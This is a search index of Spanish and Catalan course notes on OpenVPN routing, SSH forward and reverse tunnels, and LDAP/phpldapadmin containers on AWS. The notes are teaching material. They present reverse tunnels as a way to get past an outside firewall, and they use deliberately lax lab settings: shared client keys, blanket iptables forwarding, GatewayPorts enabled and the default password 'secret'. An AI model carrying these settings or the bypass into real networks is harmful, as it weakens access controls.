/etc/openvpn/client/hisxclient.conf client dev tun proto udp # remote server port remote aws 1194 resolv-retry infinite nobind persist-key persist-tun ca /etc/openvpn/keys/ca.crt cert /etc/openvpn/keys/client.crt key /etc/openvpn/keys/client.key remote-cert-tls server cipher AES-256-CBC comp-lzo verb 3","title":"Configuraci\u00f3n"},{"location":"seguridad/OpenVpn/#llaves_1","text":"Estas llaves las he extra\u00eddo del servidor ( estoy utilizando las de por defecto ), todos los clientes tendr\u00e1n las mismas. \u279c ~ sudo cp ca.crt client.crt client.key /etc/openvpn/keys \u279c ~ sudo chmod 600 /etc/openvpn/keys/* [ sudo ] password for jorge: /etc/openvpn/ \u251c\u2500\u2500 client \u2502 \u2514\u2500\u2500 hisxclient.conf \u251c\u2500\u2500 keys \u2502 \u251c\u2500\u2500 ca.crt \u2502 \u251c\u2500\u2500 client.crt \u2502 \u251c\u2500\u2500 client.key \u2502 \u2514\u2500\u2500 dh2048.pem \u2514\u2500\u2500 server Como es un entorno de pruebas y no tengo resoluci\u00f3n al servidor, asigno la resoluci\u00f3n en /etc/hosts manualmente. \u279c ~ cat /etc/hosts 127 .0.0.1 localhost 127 .0.1.1 localhost.localdomain localhost # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 3 .84.58.174 aws Enciendo el dominio del cliente por defecto con la configuraci\u00f3n hisxclient \u279c ~ sudo systemctl start openvpn-client@hisxclient Compruebo que conecta y crea la nueva interficie tun0 \u279c ~ ip a s tun0 10 : tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100 link/none inet 10 .8.0.6 peer 10 .8.0.5/32 scope global tun0 valid_lft forever preferred_lft forever inet6 fe80::ae4:71c6:32ce:c922/64 scope link stable-privacy valid_lft forever preferred_lft forever","title":"llaves"},{"location":"seguridad/OpenVpn/#conectividad-entre-redes","text":"Teniendo el servidor y cliente en marcha, en este paso se conecta la red netB en la ami de amazon con el host local y la red netA del host local con la ami de amazon. # enciendo dockers ldap y kserver en aws con la red 'netB 172.18.0.0' [ fedora@aws ~ ] $ sudo docker run --rm --name ldap.edt.org -h ldap.edt.org --net netB -d jorgepastorr/ldapserver19:final [ fedora@aws ~ ] $ sudo docker run --rm --name kserver.edt.org -h kserver.edt.org --net netB -d jorgepastorr/k19:kserver # enciendo docker local con red 'netA 172.19.0.0' \u279c ~ docker run --rm --name nethost -h nethost --net netA -d jorgepastorr/net19:nethost # desde local enruto todo el trafico de la red 172.18.0.0/16 hacia el tunel vpn 10.8.0.6 # la red 172.18.0.0 no tiene que existir en local # 10.8.0.6 es la ip local del tunel vpn \u279c ~ sudo ip route add 172 .18.0.0/16 via 10 .8.0.6 \u279c ~ ip route show default via 192 .168.88.1 dev enp3s0 proto dhcp metric 100 10 .8.0.0/24 via 10 .8.0.5 dev tun0 10 .8.0.5 dev tun0 proto kernel scope link src 10 .8.0.6 172 .17.0.0/16 dev docker0 proto kernel scope link src 172 .17.0.1 linkdown 172 .18.0.0/16 via 10 .8.0.6 dev tun0 172 .19.0.0/16 dev br-2d7ff7224245 proto kernel scope link src 172 .19.0.1 # permito pc local enrutar y abro peticiones del tunel vpn \u279c ~ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward \u279c ~ sudo iptables -A FORWARD -i tun+ -j ACCEPT # desde aws enruto todo el trafico de la red 172.19.0.0/16 hacia el tunel vpn 10.8.0.2 # la red 172.19.0.0 no tiene que existir en aws [ fedora@aws ~ ] $ sudo ip route add 172 .19.0.0/16 via 10 .8.0.2 [ fedora@aws ~ ] $ sudo ip r default via 172 .31.80.1 dev eth0 proto dhcp metric 100 10 .8.0.0/24 via 10 .8.0.2 dev tun0 10 .8.0.2 dev tun0 proto kernel scope link src 10 .8.0.1 172 .17.0.0/16 dev docker0 proto kernel scope link src 172 .17.0.1 linkdown 172 .18.0.0/16 dev br-9202ac48a79d proto kernel scope link src 172 .18.0.1 172 .19.0.0/16 via 10 .8.0.2 dev tun0 172 .31.80.0/20 dev eth0 proto kernel scope link src 172 .31.92.8 metric 100 # permito aws enrutar y abro peticiones del tunel vpn [ fedora@aws ~ ] $ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward [ fedora@aws ~ ] $ sudo iptables -A FORWARD -i tun+ -j ACCEPT # Compuebo # desde local puedo acceder a la base de datos ldap desde el enrtamiento echo de 172.18.0.0 pasando por el tunel vpn y acabando en aws. \u279c ~ ldapsearch -x -LLL -h 172 .18.0.2:389 -b 'dc=edt,dc=org' dn # desde docker local lo mismo con kserver \u279c ~ docker run --net netA --rm -it jorgepastorr/k19:khost [ root@5b295dee370e docker ] # cat /etc/hosts 127 .0.0.1 localhost 172 .19.0.3 5b295dee370e 172 .18.0.3 kserver.edt.org kserver [ root@5b295dee370e docker ] # kinit pere Password for pere@EDT.ORG: [ root@5b295dee370e docker ] # klist Ticket cache: FILE:/tmp/krb5cc_0 Default principal: pere@EDT.ORG Valid starting Expires Service principal 03 /24/20 20 :11:30 03 /25/20 20 :11:30 krbtgt/EDT.ORG@EDT.ORG","title":"Conectividad entre redes"},{"location":"seguridad/The-crazy-thing/","text":"The crazy thing! Ejercicio15 Ldap-remot i phpldapadmin-local Desplegar el servei ldap Desplegar el servei phpldapadmin Ejercicio16: Ldap-local i phpldapadmin-remot Engegar ldap i phpldapadmin i que tinguin connectivitat Ejercicio15 Ldap-remot i phpldapadmin-local Desplegem dins d\u2019un container Docker (host-remot) en una AMI (host-dest\u00ed) el servei ldap amb el firewall de la AMI nom\u00e9s obrint el port 22. Localment al host de l\u2019aula (host-local) desplegem un container amb phpldapadmin. Aquest container ha de poder accedir a les dades ldap. des del host de l\u2019aula volem poder visualitzar el phpldapadmin. Desplegar el servei ldap en el host-remot AMI AWS EC2 engegar un container ldap sense fer map dels ports. en la ami cal obrir \u00fanicament el port 22 Tamb\u00e9 cal configurar el /etc/hosts de la AMI per poder accedir al container ldap per nom de host (preferentment). verificar que des del host de l\u2019aula (host-local) podem fer consultes ldap. Desplegar el servei phpldapadmin engegar en el host de l\u2019aula (host-local) un container docker amb el servei phpldapadmin fent map del seu port 8080 al host-local (o no). crear el t\u00fanel directe ssh des del host de l\u2019aula (host-local) al servei ldap (host-remot) connectant via SSH al host AMI (host-dest\u00ed). configurar el phpldapadmin per que trobi la base de dades ldap accedint al host de l\u2019aula al port acabat de crear amb el t\u00fanel directe ssh. Ara ja podem visualitzar des del host de l\u2019aula el servei phpldapadmin, accedint al port 8080 del container phpldapadmin o al port que hem fet map del host de l\u2019aula (si \u00e9s que ho hem fet). Desplegar el servei ldap Despliego el servicio ldap en un docker de aws . [ fedora@aws ~ ] $ docker run --rm --name ldap.edt.org -h ldap.edt.org --net mynet -d jorgepastorr/ldapserver19 initdbedt Asigno la resoluci\u00f3n del contenedor en /etc/hosts de la instancia ami [ fedora@aws ~ ] $ echo '192.168.16.2 ldap.edt.org' | sudo tee -a /etc/hosts Compruebo que en la ami solo esta abierto el puerto 22 [ fedora@aws ~ ] $ nmap localhost PORT STATE SERVICE 22 /tcp open ssh Desde casa creo un t\u00fanel directo, abre puerto 50000 del host-local hacia el host-destino (ami) que redirige el t\u00fanel al container ldap en el puerto 389. Y compruebo que desde host-local (casa) que puedo acceder a la base de datos ldap desde el puerto 50000. casa \u279c ssh -i key-aws-educate.pem -L 50000 :ldap.edt.org:389 fedora@3.91.49.124 casa \u279c ldapsearch -x -LLL -h localhost -p 50000 -b 'dc=edt,dc=org' dn dn: dc = edt,dc = org dn: ou = grups,dc = edt,dc = org dn: ou = usuaris,dc = edt,dc = org dn: cn = hisx1,ou = grups,dc = edt,dc = org dn: cn = hisx2,ou = grups,dc = edt,dc = org dn: cn = hisx3,ou = grups,dc = edt,dc = org ... Desplegar el servei phpldapadmin En aws existe un ldap desplegado pero no tengo acceso directo desde casa solo ssh. pasos para incorporar phpldapadmin local hacia aws: Abro un t\u00fanel directo desde hot-local (casa) en la interficie mynet (172.19.0.1) puerto 50000 hacia host-destino (aws) y este redirecciona a host-remoto (container ldap) en el puerto 389. casa \u279c ssh -i key-aws-educate.pem -L 172 .19.0.1:50000:ldap.edt.org:389 fedora@3.91.49.124 Despliego el container phpldapadmin en interactivo, por que tengo que cambiar la configuraci\u00f3n. (Tambi\u00e9n exporto puerto 80 a 8080 pero no es necesario, solo por comodidad.) casa \u279c docker run --rm --name php -h php -p 8080 :80 --net mynet -it jorgepastorr/phpldapadmin /bin/bash Cambio la configuraci\u00f3n del archivo config.php a la entrada del t\u00fanel creado para que redireccione hasta el container ldap de aws [ root@php ] vim config.php $servers ->setValue ( 'server' , 'host' , '172.19.0.1' ) ; $servers ->setValue ( 'server' , 'port' ,50000 ) ; # enciendo el servicio phpldapadmin con la nueva configuraci\u00f3n [ root@php ] bash startup.sh Desde el navegador de casa accedemos al puerto expuesto por el container phpldapadmin, y accedemos a la base de datos ldap. browser localhost:8080/phpldapadmin login --> user 'cn=Manager,dc=edt,dc=org' --> password 'secret' Ejercicio16: Ldap-local i phpldapadmin-remot Obrir localment un ldap al host. Engegar al AWS un container phpldapadmin que usa el ldap del host de l\u2019aula. Visualitzar localment al host de l\u2019aula el phpldapadmin del container de AWS EC2. Ah\u00ed ez n\u00e0. Engegar ldap i phpldapadmin i que tinguin connectivitat: Engegar localment el servei ldap al host-local de l\u2019aula. Obrir un t\u00fanel invers SSH en la AMI de AWS EC2 (host-dest\u00ed) l ligat al servei ldap del host-local de l\u2019aula. Engegar el servei phpldapadmin en un container Docker dins de la m\u00e0quina AMI. cal confiurar-lo perqu\u00e8 connecti al servidor ldap indicant-li la ip de la AMI i el port obert per el t\u00fanel SSH. nota atenci\u00f3 al binding que fa ssh dels ports dels t\u00fanels SSH (per defecte s\u00f3n nom\u00e9s al localhost). Ara cal accedir des del host de l\u2019aula al port 8080 del phpldapadmin per visualitzar-lo. Per fer-ho cal: en la AMI configutat el /etc/hosts per poder accedir per nom de host (per exemple php) al port apropiat del servei phpldapadmin. establir un t\u00fanel directe del host de l\u2019aula (host-local) al host-remo t phpldapadmin passant pel host-dest\u00ed (la AMI). Ara amb un navegador ja podem visualitzar localment des del host de l\u2019aula el phpldapadmin connectant al pot directe acabat de crear. nota atenci\u00f3 al binding que fa ssh dels ports dels t\u00fanels SSH (per defecte s\u00f3n nom\u00e9s al localhost). Engegar ldap i phpldapadmin i que tinguin connectivitat En esta practica enciendo un ldap local, un phpldapadmin en aws que mira los datos del ldap local mediante un tunel inverso ssh, y con otro tunel directo de local a aws puedo ver el phpldapadmin desde mi navegador local. Despliego en local el server ldap con puertos mapeados en 389 localhost (no es necesario mapear puertos, peri si c\u00f3modo) bash casa \u279c docker run --rm --name ldap.edt.org -h ldap.edt.org -p 389:389 --net mynet -d jorgepastorr/ldapserver19:entrypoint initdbedt En aws configuro el servidor sshd para que los t\u00faneles inversos puedan hacer bind en diferentes interficies , por defecto solo permite localhost. [ fedora@aws ~ ] $ vi /etc/ssh/sshd_config ... GatewayPorts yes ... En aws arranco un contenedor con phpldapadmin y en la configuraci\u00f3n le asigno que recoja los datos de ldap en el gateway de su red y el puerto 50000 que abrir\u00e9 un t\u00fanel en el siguiente paso. [ fedora@aws ~ ] $ docker run --rm --name php -h php --net mynet -it jorgepastorr/phpldapadmin /bin/bash [ root@php ] vim config.php $servers ->setValue ( 'server' , 'host' , '192.168.16.1' ) ; $servers ->setValue ( 'server' , 'port' ,50000 ) ; [ root@php ] bash startup.sh Desde local abro un t\u00fanel inverso desde el servicio local ldap localhost:389 hasta el host-destino (aws) que hace un bind de interficie 192.168.16.1:50000 . esta interficie es el gateway de phpldapadmin de aws. Para que phpldapadmin pueda hacer consultas de la base de datos ldap. casa \u279c ssh -i key-aws-educate.pem -R 192 .168.16.1:50000:localhost:389 fedora@3.91.49.124 Compruebo, que el bind esta bien echo: [ fedora@aws ~ ] $ netstat -tan4 Active Internet connections ( servers and established ) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0 .0.0.0:22 0 .0.0.0:* LISTEN tcp 0 0 0 .0.0.0:50000 0 .0.0.0:* LISTEN Creo una resoluci\u00f3n de nombre para el docker phpldapadmin [ fedora@aws ~ ] $ echo '192.168.16.2 ldapadmin' | sudo tee -a /etc/hosts Para finalizar desde local creo un t\u00fanel directo que abre el puerto localhost:8080 del host-local pasando por el host-desti (aws) y este redireccionando a host-remoto ldapadmin:80 contenedor de aws. casa \u279c ssh -i key-aws-educate.pem -L 8080 :ldapadmin:80 fedora@3.91.49.124 Desde el navegador de casa accedemos a phpldapadmin de aws, por el t\u00fanel creado directo. browser localhost:8080/phpldapadmin login --> user 'cn=Manager,dc=edt,dc=org' --> password 'secret'","title":"The crazy thing!"},{"location":"seguridad/The-crazy-thing/#the-crazy-thing","text":"Ejercicio15 Ldap-remot i phpldapadmin-local Desplegar el servei ldap Desplegar el servei phpldapadmin Ejercicio16: Ldap-local i phpldapadmin-remot Engegar ldap i phpldapadmin i que tinguin connectivitat","title":"The crazy thing!"},{"location":"seguridad/The-crazy-thing/#ejercicio15-ldap-remot-i-phpldapadmin-local","text":"Desplegem dins d\u2019un container Docker (host-remot) en una AMI (host-dest\u00ed) el servei ldap amb el firewall de la AMI nom\u00e9s obrint el port 22. Localment al host de l\u2019aula (host-local) desplegem un container amb phpldapadmin. Aquest container ha de poder accedir a les dades ldap. des del host de l\u2019aula volem poder visualitzar el phpldapadmin. Desplegar el servei ldap en el host-remot AMI AWS EC2 engegar un container ldap sense fer map dels ports. en la ami cal obrir \u00fanicament el port 22 Tamb\u00e9 cal configurar el /etc/hosts de la AMI per poder accedir al container ldap per nom de host (preferentment). verificar que des del host de l\u2019aula (host-local) podem fer consultes ldap. Desplegar el servei phpldapadmin engegar en el host de l\u2019aula (host-local) un container docker amb el servei phpldapadmin fent map del seu port 8080 al host-local (o no). crear el t\u00fanel directe ssh des del host de l\u2019aula (host-local) al servei ldap (host-remot) connectant via SSH al host AMI (host-dest\u00ed). configurar el phpldapadmin per que trobi la base de dades ldap accedint al host de l\u2019aula al port acabat de crear amb el t\u00fanel directe ssh. Ara ja podem visualitzar des del host de l\u2019aula el servei phpldapadmin, accedint al port 8080 del container phpldapadmin o al port que hem fet map del host de l\u2019aula (si \u00e9s que ho hem fet).","title":"Ejercicio15 Ldap-remot i phpldapadmin-local"},{"location":"seguridad/The-crazy-thing/#desplegar-el-servei-ldap","text":"Despliego el servicio ldap en un docker de aws . [ fedora@aws ~ ] $ docker run --rm --name ldap.edt.org -h ldap.edt.org --net mynet -d jorgepastorr/ldapserver19 initdbedt Asigno la resoluci\u00f3n del contenedor en /etc/hosts de la instancia ami [ fedora@aws ~ ] $ echo '192.168.16.2 ldap.edt.org' | sudo tee -a /etc/hosts Compruebo que en la ami solo esta abierto el puerto 22 [ fedora@aws ~ ] $ nmap localhost PORT STATE SERVICE 22 /tcp open ssh Desde casa creo un t\u00fanel directo, abre puerto 50000 del host-local hacia el host-destino (ami) que redirige el t\u00fanel al container ldap en el puerto 389. Y compruebo que desde host-local (casa) que puedo acceder a la base de datos ldap desde el puerto 50000. casa \u279c ssh -i key-aws-educate.pem -L 50000 :ldap.edt.org:389 fedora@3.91.49.124 casa \u279c ldapsearch -x -LLL -h localhost -p 50000 -b 'dc=edt,dc=org' dn dn: dc = edt,dc = org dn: ou = grups,dc = edt,dc = org dn: ou = usuaris,dc = edt,dc = org dn: cn = hisx1,ou = grups,dc = edt,dc = org dn: cn = hisx2,ou = grups,dc = edt,dc = org dn: cn = hisx3,ou = grups,dc = edt,dc = org ...","title":"Desplegar el servei ldap"},{"location":"seguridad/The-crazy-thing/#desplegar-el-servei-phpldapadmin","text":"En aws existe un ldap desplegado pero no tengo acceso directo desde casa solo ssh. pasos para incorporar phpldapadmin local hacia aws: Abro un t\u00fanel directo desde hot-local (casa) en la interficie mynet (172.19.0.1) puerto 50000 hacia host-destino (aws) y este redirecciona a host-remoto (container ldap) en el puerto 389. casa \u279c ssh -i key-aws-educate.pem -L 172 .19.0.1:50000:ldap.edt.org:389 fedora@3.91.49.124 Despliego el container phpldapadmin en interactivo, por que tengo que cambiar la configuraci\u00f3n. (Tambi\u00e9n exporto puerto 80 a 8080 pero no es necesario, solo por comodidad.) casa \u279c docker run --rm --name php -h php -p 8080 :80 --net mynet -it jorgepastorr/phpldapadmin /bin/bash Cambio la configuraci\u00f3n del archivo config.php a la entrada del t\u00fanel creado para que redireccione hasta el container ldap de aws [ root@php ] vim config.php $servers ->setValue ( 'server' , 'host' , '172.19.0.1' ) ; $servers ->setValue ( 'server' , 'port' ,50000 ) ; # enciendo el servicio phpldapadmin con la nueva configuraci\u00f3n [ root@php ] bash startup.sh Desde el navegador de casa accedemos al puerto expuesto por el container phpldapadmin, y accedemos a la base de datos ldap. browser localhost:8080/phpldapadmin login --> user 'cn=Manager,dc=edt,dc=org' --> password 'secret'","title":"Desplegar el servei phpldapadmin"},{"location":"seguridad/The-crazy-thing/#ejercicio16-ldap-local-i-phpldapadmin-remot","text":"Obrir localment un ldap al host. Engegar al AWS un container phpldapadmin que usa el ldap del host de l\u2019aula. Visualitzar localment al host de l\u2019aula el phpldapadmin del container de AWS EC2. Ah\u00ed ez n\u00e0. Engegar ldap i phpldapadmin i que tinguin connectivitat: Engegar localment el servei ldap al host-local de l\u2019aula. Obrir un t\u00fanel invers SSH en la AMI de AWS EC2 (host-dest\u00ed) l ligat al servei ldap del host-local de l\u2019aula. Engegar el servei phpldapadmin en un container Docker dins de la m\u00e0quina AMI. cal confiurar-lo perqu\u00e8 connecti al servidor ldap indicant-li la ip de la AMI i el port obert per el t\u00fanel SSH. nota atenci\u00f3 al binding que fa ssh dels ports dels t\u00fanels SSH (per defecte s\u00f3n nom\u00e9s al localhost). Ara cal accedir des del host de l\u2019aula al port 8080 del phpldapadmin per visualitzar-lo. Per fer-ho cal: en la AMI configutat el /etc/hosts per poder accedir per nom de host (per exemple php) al port apropiat del servei phpldapadmin. establir un t\u00fanel directe del host de l\u2019aula (host-local) al host-remo t phpldapadmin passant pel host-dest\u00ed (la AMI). Ara amb un navegador ja podem visualitzar localment des del host de l\u2019aula el phpldapadmin connectant al pot directe acabat de crear. nota atenci\u00f3 al binding que fa ssh dels ports dels t\u00fanels SSH (per defecte s\u00f3n nom\u00e9s al localhost).","title":"Ejercicio16: Ldap-local i phpldapadmin-remot"},{"location":"seguridad/The-crazy-thing/#engegar-ldap-i-phpldapadmin-i-que-tinguin-connectivitat","text":"En esta practica enciendo un ldap local, un phpldapadmin en aws que mira los datos del ldap local mediante un tunel inverso ssh, y con otro tunel directo de local a aws puedo ver el phpldapadmin desde mi navegador local. Despliego en local el server ldap con puertos mapeados en 389 localhost (no es necesario mapear puertos, peri si c\u00f3modo) bash casa \u279c docker run --rm --name ldap.edt.org -h ldap.edt.org -p 389:389 --net mynet -d jorgepastorr/ldapserver19:entrypoint initdbedt En aws configuro el servidor sshd para que los t\u00faneles inversos puedan hacer bind en diferentes interficies , por defecto solo permite localhost. [ fedora@aws ~ ] $ vi /etc/ssh/sshd_config ... GatewayPorts yes ... En aws arranco un contenedor con phpldapadmin y en la configuraci\u00f3n le asigno que recoja los datos de ldap en el gateway de su red y el puerto 50000 que abrir\u00e9 un t\u00fanel en el siguiente paso. [ fedora@aws ~ ] $ docker run --rm --name php -h php --net mynet -it jorgepastorr/phpldapadmin /bin/bash [ root@php ] vim config.php $servers ->setValue ( 'server' , 'host' , '192.168.16.1' ) ; $servers ->setValue ( 'server' , 'port' ,50000 ) ; [ root@php ] bash startup.sh Desde local abro un t\u00fanel inverso desde el servicio local ldap localhost:389 hasta el host-destino (aws) que hace un bind de interficie 192.168.16.1:50000 . esta interficie es el gateway de phpldapadmin de aws. Para que phpldapadmin pueda hacer consultas de la base de datos ldap. casa \u279c ssh -i key-aws-educate.pem -R 192 .168.16.1:50000:localhost:389 fedora@3.91.49.124 Compruebo, que el bind esta bien echo: [ fedora@aws ~ ] $ netstat -tan4 Active Internet connections ( servers and established ) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0 .0.0.0:22 0 .0.0.0:* LISTEN tcp 0 0 0 .0.0.0:50000 0 .0.0.0:* LISTEN Creo una resoluci\u00f3n de nombre para el docker phpldapadmin [ fedora@aws ~ ] $ echo '192.168.16.2 ldapadmin' | sudo tee -a /etc/hosts Para finalizar desde local creo un t\u00fanel directo que abre el puerto localhost:8080 del host-local pasando por el host-desti (aws) y este redireccionando a host-remoto ldapadmin:80 contenedor de aws. casa \u279c ssh -i key-aws-educate.pem -L 8080 :ldapadmin:80 fedora@3.91.49.124 Desde el navegador de casa accedemos a phpldapadmin de aws, por el t\u00fanel creado directo. browser localhost:8080/phpldapadmin login --> user 'cn=Manager,dc=edt,dc=org' --> password 'secret'","title":"Engegar ldap i phpldapadmin i que tinguin connectivitat"},{"location":"seguridad/TunelSSH/","text":"Tunel SSH Elementos tipologia host-local : Host des del que trabajas y estableces un tunel ssh. Por ejemplo el ordenador de casa hacendo un ssh al router de la empresa. host-desti : El host destino es el host al que conectas via ssh user@hostdesti , este host normalmente es un router si se hace una conexi\u00f3n remota, de casa a la empresa. En caso de ser una conexi\u00f3n local el host desti ser\u00e1 un host de tu misma lan. host-remot : El host remoto, es el que de una conexi\u00f3n de casa a la empresa el host de la empresa que esta dentro de la red local privada. Casa Empresa +----------------------+ +-----------------+ | | | | | host-remoto | | | +---+ +---+ | | host-local | | | | +-----> | | +------+ | | | | | | | | | | +------------> | | | +---+ | | +------+ | +---+ | | | router host-desti | +-----------------+ | | +----------------------+ Tipos de t\u00faneles T\u00fanel directo a host-desti : Es el t\u00fanel mas usado, de un host-local a un host-destino, una vez en el host-desti rebotas a localhost, as\u00ed puedes acceder a servicios no publicados y solo disponibles para localhost del destino. -L 9001:localhost:80 ssh -L [ interficie-local ] :puerto-local:hist-destino:puerto-destino user@destino T\u00fanel directo a host-desti para acceder a host-remot : En este modelo desde el host-local queremos acceder al host-remoto. Pero como lo hacemos si no tiene acceso?. Es necesario acceder desde el host-local a un host-destino y de este rebotar al host-remoto. -L 9001:ldap:389 ssh -L [ interficie-local ] :puerto-local:host-remoto:puerto-remoto user@destino T\u00fanel reverse al host-desti : Es exactamente lo contrario a un t\u00fanel directo a host-desti. Desde host-local abres un t\u00fanel a host-desti que deja la puerta abierta a host-desti para acceder a host-local, es una manera de saltarte el firewall exterior. -R 9001:localhost:80 ssh -R [ interficie-destino ] :puerto-destino:host-local:puerto-local user@destino t\u00fanel reverse al host-remoto : En este caso el host-local abre un t\u00fanel a host-destino, para que destino pueda entrar desde el puerto abierto en host-destino pasando por host-local y este redireccionar\u00e1 a un host-remoto -R 9001:ldap:389 ssh -L [ interficie-destino ] :puerto-destino:host-remoto:puerto-remoto user@destino Binding : Es asignar un puerto a una interficie en concreto, por defecto el puerto que se abre se en localhost, pero esto es posible cambiarlo. Por ejemplo: 0.0.0.0:9001:localhost:80 , en este caso se esta asignando el puerto 9001 a todas las interficies. Hay que tener en cuenta en el binding si es un t\u00fanel directo, el binding se har\u00e1 perfectamente por que el puerto se abre en la maquina local. Pero si es un binding inverso el servidor sshd del host-destino tiene que tener la siguiente configuraci\u00f3n activada, en caso contrario no dejara abrir puertos en interficies que no sean localhost. vim /etc/ssh/sshd_config ... GatewayPorts yes ... Ejemplos: Directos Local-destino : Creo un t\u00fanel que abre el puerto 9001 local y me env\u00eda al puerto 80 de la interficie localhost de destino \u279c ~ ssh -L 9001 :localhost:80 jorge@portatil \u279c ~ curl http://localhost:9001 bienvenido apache bla bla... # lo mismo pero con el cambio de interficie local \u279c ~ ssh -L 192 .168.88.2:9001:localhost:80 jorge@portatil \u279c ~ curl http://192.168.88.2:9001 bienvenido apache bla bla... local - destino - remoto: Ejemplo1: Creo un t\u00fanel que me env\u00eda desde mi puerto local 9001 a el host destino portatil y este me reenv\u00eda a remoto yahoo.com:80 \u279c ~ ssh -L 9001 :yahoo.com:80 jorge@portatil \u279c ~ curl http://localhost:9001 bienvenido yahoo ... Ejemplo2: En este ejemplo simulo que desde el host-local no tengo acceso al server (host-remoto), pero desde portatil (host-desti) si. Creo un tunel que abre el puerto 9001 del host-local que me env\u00eda al portatil y el portatil me reenv\u00eda al puerto 22 del server. # creo tunel \u279c ~ ssh -L 9001 :server:22 jorge@portatil # me conecto al puerto 9001 local con ssh y el usuario pi del server \u279c ~ ssh -p 9001 pi@localhost # el tunel me reenvia al server. pi@raspberrypi:~ $ Ejemplo3: Quien hace la resoluci\u00f3n? el host-local hace la resoluci\u00f3n de host-destino, host-destino hace la resoluci\u00f3n de host-remoto. As\u00ed aun que host-local no sabe la resoluci\u00f3n de portatil, no importa por que la har\u00e1 host-destino. [ fedora@aws ~ ] $ ssh -L 3034 :portatil:13 pi@casa Inversos local-destino : host-local (aws) corre un servicio de daytime en el puerto 13, pero es solo local el firewall corta todas las entradas. Entonces desde aws conecto con host-destino (casa) y abro el puerto 3035 donde conecta con el localhost:13 de aws. [ fedora@aws ~ ] $ ssh -R 3035 :localhost:13 pi@casa pi@casa:~ $ curl http://localhost:3035 17 MAR 2020 17 :19:08 UTC local-destino-remoto : En este ejemplo El firewall bloquea todas las entradas del exterior, entonces desde casa establezco una conexi\u00f3n inversa con aws para que desde el puerto aws:3035 pueda acceder a casa y la redirijo al portatil:13 que tiene el servidor daytime. casa \u279c ssh -R 3035 :portatil:13 fedora@aws [ fedora@aws ~ ] $ curl http://localhost:3035 17 MAR 2020 17 :38:34 UTC diagrama: +-+ +----+ | | | | portatil firewall | | P:13 | | +----+ aws | | ^ | | | +---+ | | +-----+ | | | | | | | | <-----------+ | | +---+ | | +-----+ P:3035 +-+ casa dinamicos ssh -D 9000 home","title":"Tunel SSH"},{"location":"seguridad/TunelSSH/#tunel-ssh","text":"","title":"Tunel SSH"},{"location":"seguridad/TunelSSH/#elementos-tipologia","text":"host-local : Host des del que trabajas y estableces un tunel ssh. Por ejemplo el ordenador de casa hacendo un ssh al router de la empresa. host-desti : El host destino es el host al que conectas via ssh user@hostdesti , este host normalmente es un router si se hace una conexi\u00f3n remota, de casa a la empresa. En caso de ser una conexi\u00f3n local el host desti ser\u00e1 un host de tu misma lan. host-remot : El host remoto, es el que de una conexi\u00f3n de casa a la empresa el host de la empresa que esta dentro de la red local privada. Casa Empresa +----------------------+ +-----------------+ | | | | | host-remoto | | | +---+ +---+ | | host-local | | | | +-----> | | +------+ | | | | | | | | | | +------------> | | | +---+ | | +------+ | +---+ | | | router host-desti | +-----------------+ | | +----------------------+","title":"Elementos tipologia"},{"location":"seguridad/TunelSSH/#tipos-de-tuneles","text":"T\u00fanel directo a host-desti : Es el t\u00fanel mas usado, de un host-local a un host-destino, una vez en el host-desti rebotas a localhost, as\u00ed puedes acceder a servicios no publicados y solo disponibles para localhost del destino. -L 9001:localhost:80 ssh -L [ interficie-local ] :puerto-local:hist-destino:puerto-destino user@destino T\u00fanel directo a host-desti para acceder a host-remot : En este modelo desde el host-local queremos acceder al host-remoto. Pero como lo hacemos si no tiene acceso?. Es necesario acceder desde el host-local a un host-destino y de este rebotar al host-remoto. -L 9001:ldap:389 ssh -L [ interficie-local ] :puerto-local:host-remoto:puerto-remoto user@destino T\u00fanel reverse al host-desti : Es exactamente lo contrario a un t\u00fanel directo a host-desti. Desde host-local abres un t\u00fanel a host-desti que deja la puerta abierta a host-desti para acceder a host-local, es una manera de saltarte el firewall exterior. -R 9001:localhost:80 ssh -R [ interficie-destino ] :puerto-destino:host-local:puerto-local user@destino t\u00fanel reverse al host-remoto : En este caso el host-local abre un t\u00fanel a host-destino, para que destino pueda entrar desde el puerto abierto en host-destino pasando por host-local y este redireccionar\u00e1 a un host-remoto -R 9001:ldap:389 ssh -L [ interficie-destino ] :puerto-destino:host-remoto:puerto-remoto user@destino Binding : Es asignar un puerto a una interficie en concreto, por defecto el puerto que se abre se en localhost, pero esto es posible cambiarlo. Por ejemplo: 0.0.0.0:9001:localhost:80 , en este caso se esta asignando el puerto 9001 a todas las interficies. Hay que tener en cuenta en el binding si es un t\u00fanel directo, el binding se har\u00e1 perfectamente por que el puerto se abre en la maquina local. Pero si es un binding inverso el servidor sshd del host-destino tiene que tener la siguiente configuraci\u00f3n activada, en caso contrario no dejara abrir puertos en interficies que no sean localhost. vim /etc/ssh/sshd_config ... GatewayPorts yes ...","title":"Tipos de t\u00faneles"},{"location":"seguridad/TunelSSH/#ejemplos","text":"","title":"Ejemplos:"},{"location":"seguridad/TunelSSH/#directos","text":"Local-destino : Creo un t\u00fanel que abre el puerto 9001 local y me env\u00eda al puerto 80 de la interficie localhost de destino \u279c ~ ssh -L 9001 :localhost:80 jorge@portatil \u279c ~ curl http://localhost:9001 bienvenido apache bla bla... # lo mismo pero con el cambio de interficie local \u279c ~ ssh -L 192 .168.88.2:9001:localhost:80 jorge@portatil \u279c ~ curl http://192.168.88.2:9001 bienvenido apache bla bla... local - destino - remoto: Ejemplo1: Creo un t\u00fanel que me env\u00eda desde mi puerto local 9001 a el host destino portatil y este me reenv\u00eda a remoto yahoo.com:80 \u279c ~ ssh -L 9001 :yahoo.com:80 jorge@portatil \u279c ~ curl http://localhost:9001 bienvenido yahoo ... Ejemplo2: En este ejemplo simulo que desde el host-local no tengo acceso al server (host-remoto), pero desde portatil (host-desti) si. Creo un tunel que abre el puerto 9001 del host-local que me env\u00eda al portatil y el portatil me reenv\u00eda al puerto 22 del server. # creo tunel \u279c ~ ssh -L 9001 :server:22 jorge@portatil # me conecto al puerto 9001 local con ssh y el usuario pi del server \u279c ~ ssh -p 9001 pi@localhost # el tunel me reenvia al server. pi@raspberrypi:~ $ Ejemplo3: Quien hace la resoluci\u00f3n? 